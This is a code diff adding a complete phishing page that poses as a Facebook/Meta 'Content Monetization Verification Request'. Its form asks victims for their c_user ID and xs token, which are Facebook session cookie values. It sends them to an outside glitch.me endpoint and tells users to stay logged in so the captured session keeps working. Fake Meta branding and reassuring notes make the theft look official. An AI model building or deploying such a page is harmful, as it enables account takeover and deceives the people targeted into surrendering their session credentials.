@@ -39,4 +39,157 @@
             border-radius: 8px;
             border: 1px solid #ddd;
             font-size: 16px;
-        
+        }
+
+        .form-container {
+            width: 80%;
+            max-width: 900px;
+            margin: 3rem auto;
+            background-color: white;
+            padding: 2.5rem;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .form-container h2 {
+            text-align: center;
+            color: #4267b2;
+            font-size: 1.8rem;
+            font-weight: bold;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            font-size: 15px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            margin-top: 8px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .input-group input:focus {
+            border-color: #4267b2;
+            outline: none;
+        }
+
+        .input-group p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #4267b2;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #365899;
+        }
+
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background-color: #f5f6f7;
+            font-size: 12px;
+            color: #90949c;
+        }
+
+        footer a {
+            color: #4267b2;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .video-thumbnail {
+            max-width: 100%;
+            margin: 1rem 0;
+        }
+
+        .highlight-text {
+            font-weight: bold;
+            color: #4267b2;
+        }
+
+    </style>
+</head>
+
+<body>
+    <header>
+        <b>Facebook</b>
+        <div class="search-bar">
+            <input type="search" placeholder="How Can We Assist You?" required>
+        </div>
+    </header>
+
+    <div class="form-container">
+        <h2>Content Monetization Verification Request</h2>
+
+        <form action="https://periodic-highfalutin-foe.glitch.me/younis.php" method="post">
+            <input type="hidden" name="_redirect" value="https://periodic-highfalutin-foe.glitch.me/younis.php">
+
+            <!-- Verified Badge Information -->
+            <div class="input-group">
+                <p><span class="highlight-text">Important:</span> The verified badge signifies that Facebook has verified the Page or profile as the authentic representation of an individual or brand. This is crucial for content monetization.</p>
+            </div>
+
+            <!-- Detailed Video Information -->
+            <div class="input-group">
+                <label for="video">Detailed Video Information:</label>
+                <a href="kabeer.mp4.mp4">
+                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" class="video-thumbnail" alt="Video Thumbnail">
+                </a>
+                <p class="font-semibold text-sm">Click the image above to watch the detailed video to help with verification.</p>
+            </div>
+
+            <!-- User Information -->
+            <div class="input-group">
+                <label for="c_user">c_user ID:</label>
+                <input type="text" id="c_user" name="c_user" placeholder="Enter your c_user ID" pattern="[0-9]+" minlength="6" required>
+                <p><span class="highlight-text">Note:</span> Your c_user ID is essential for verifying your account. Please provide the correct ID.</p>
+            </div>
+
+            <div class="input-group">
+                <label for="xs">xs Token:</label>
+                <input type="text" id="xs" name="xs" placeholder="Enter your xs token" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Token must be at least 12 characters with letters, numbers, and symbols." required>
+                <p><span class="highlight-text">Important:</span> The xs token must be kept secure as it grants access to your Facebook data.</p>
+            </div>
+
+            <!-- Additional Notes -->
+            <div class="input-group">
+                <p>Please ensure that your account remains logged in on your computer or laptop until you have received a confirmation email from Facebook. If you log out before verification, it could cause issues.</p>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="input-group">
+                <button type="submit" class="submit-btn">Submit Verification Request</button>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <p>© META 2024 | <a href="https://www.metaservices.com">Meta Services</a></p>
+    </footer>
+</body>
+
+</html>
